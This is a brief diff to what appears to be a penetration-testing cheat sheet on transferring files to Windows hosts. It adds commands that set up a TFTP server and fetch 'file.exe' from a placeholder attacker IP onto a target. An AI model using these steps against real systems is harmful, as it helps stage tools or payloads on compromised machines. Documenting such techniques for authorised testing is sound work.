@@ -46,3 +46,10 @@ Installed on Windows XP up to 2003 by default
 On Windows 
 >tftp -i --yourIP-- get file.exe
 
+
+```
+mkdir /tftp
+aftpd --daemon --port 69 /tftp
+cp /file/you/want /tftp
+tftp -i --yourIP-- get file.exe
+```
